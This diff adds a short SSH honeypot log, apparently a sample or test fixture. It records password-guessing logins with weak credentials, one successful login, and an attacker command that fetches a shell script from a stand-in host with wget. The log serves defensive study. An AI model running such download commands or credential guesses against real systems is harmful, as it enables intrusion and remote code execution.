@@ -1,0 +1,5 @@
+2025-05-22 04:00:12+0000 [SSHService ssh-userauth on HoneyPotTransport,123] login attempt [user root, password 123456] from 192.168.1.100
+2025-05-22 04:00:13+0000 [SSHService ssh-userauth on HoneyPotTransport,123] login attempt [user admin, password letmein] from 192.168.1.101
+2025-05-22 04:00:14+0000 [SSHService ssh-userauth on HoneyPotTransport,123] login succeeded [user admin, password letmein] from 192.168.1.101
+2025-05-22 04:00:20+0000 [HoneyPotSSHChannel session open] CMD: ls -la
+2025-05-22 04:00:21+0000 [HoneyPotSSHChannel session open] CMD: wget http://malicious.example.com/file.sh
